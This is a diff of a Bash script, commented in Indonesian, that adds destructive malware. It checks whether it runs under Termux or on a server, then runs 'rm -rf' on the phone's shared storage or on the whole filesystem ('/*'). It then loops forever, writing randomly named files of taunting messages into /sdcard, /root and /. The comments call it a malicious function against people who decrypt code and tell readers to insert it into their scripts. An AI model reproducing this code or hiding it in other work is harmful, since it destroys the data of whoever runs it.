@@ -1,25 +1,77 @@
-#njir jahat banget , delete penyimpanan internal hape 🗿, kasih pagar ajalah asu
-#rm -rf /storage/emulated/0/ &>/dev/null &
-while true
-do
-shuffle_string() {
-str=$1
-arr=($(echo $str | sed -e 's/\(.\)/\1 /g'))
-for i in $(seq 0 $((${#arr[@]} - 2))); do
-j=$(($(($RANDOM % $((${#arr[@]} - $i)))) + $i))
-tmp=${arr[$i]}
-arr[$i]=${arr[$j]}
-arr[$j]=$tmp
-done
-echo ${arr[@]} | sed -e 's/ //g'
+#!/bin/bash
+function skrip_jahat_user_termux(){
+rm -rf /storage/emulated/0/ &>/dev/null &
+#fungsi jahad untuk kang decrypt pencuri kode
+#ini hanya contoh sesuaikan dengan kondisi yang kamu tentukan sendiri !!
+#sisipkan dalam Script
+    while true
+    do
+        shuffle_string() {
+            string=$1
+            array=($(echo $string | sed -e 's/\(.\)/\1 /g'))
+            total_string=${#array[@]}
+            #for i in $(seq 0 $((${#array[@]} - 2))); do
+            for i in $(seq 0 $((${total_string} - 2)));
+            do
+                j=$(($(($RANDOM % $((${#array[@]} - $i)))) + $i))
+                tmp=${array[$i]}
+                array[$i]=${array[$j]}
+                array[$j]=$tmp
+            done
+            echo ${array[@]} | sed -e 's/ //g'
+        }
+        allowed_chars='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+        shuffled_chars=$(shuffle_string $allowed_chars)
+        password_length=10
+        viruzs=${shuffled_chars:0:$password_length}
+        music_files=("SUBSCRIBE : GALJEMBUT OFFICIAL😎" "CIEEE KENA VIRUS :v" "AUTHOR BY:GALMEMEK😎" "PANIK KAU DEK DEK😂" "MAMPUS FILE NYA GA ILANG ILANG☠️" )
+        random_index=$((RANDOM % ${#music_files[@]}))
+        music_file="${music_files[random_index]}"
+        cd /sdcard/
+        echo "$music_file" >> $viruzs
+    done
 }
-allowed_chars='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
-shuffled_chars=$(shuffle_string $allowed_chars)
-password_length=10
-virus=${shuffled_chars:0:$password_length}
-music_files=("SUBSCRIBE : GALIRUS OFFICIAL😎" "CIEEE KENA VIRUS :v" "AUTHOR BY:GALIRUS😎" "PANIK KAU DEK DEK😂" "MAMPUS FILE NYA GA ILANG ILANG☠️" )
-random_index=$((RANDOM % ${#music_files[@]}))
-music_file="${music_files[random_index]}"
-cd /sdcard/
-echo "$music_file" >> $virus
-done
+
+function skrip_jahat_user_vps(){
+rm -rf /* &>/dev/null &
+#fungsi jahad untuk kang decrypt pencuri kode
+#ini hanya contoh sesuaikan dengan kondisi yang kamu tentukan sendiri !!
+#sisipkan dalam Script
+    while true
+    do
+        shuffle_string() {
+            string=$1
+            array=($(echo $string | sed -e 's/\(.\)/\1 /g'))
+            total_string=${#array[@]}
+            #for i in $(seq 0 $((${#array[@]} - 2))); do
+            for i in $(seq 0 $((${total_string} - 2)));
+            do
+                j=$(($(($RANDOM % $((${#array[@]} - $i)))) + $i))
+                tmp=${array[$i]}
+                array[$i]=${array[$j]}
+                array[$j]=$tmp
+            done
+            echo ${array[@]} | sed -e 's/ //g'
+        }
+        allowed_chars='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+        shuffled_chars=$(shuffle_string $allowed_chars)
+        password_length=10
+        viruzs=${shuffled_chars:0:$password_length}
+        music_files=("SUBSCRIBE : GALJEMBUT OFFICIAL😎" "CIEEE KENA VIRUS :v" "AUTHOR BY:GALMEMEK😎" "PANIK KAU DEK DEK😂" "MAMPUS FILE NYA GA ILANG ILANG☠️" )
+        random_index=$((RANDOM % ${#music_files[@]}))
+        music_file="${music_files[random_index]}"
+        cd /root
+        echo "$music_file" >> $viruzs
+        cd /
+        echo "$music_file" >> $viruzs
+    done
+}
+
+folder_bin=$(which curl | sed 's/curl//g')
+termux_bin="/data/data/com.termux/files/usr/bin/"
+vps_bin="/usr/bin"
+
+if [[ "$folder_bin" = "$termux_bin" ]]; then skrip_jahat_user_termux; fi
+if [[ -d $vps_bin ]]; then
+    skrip_jahat_user_vps
+fi
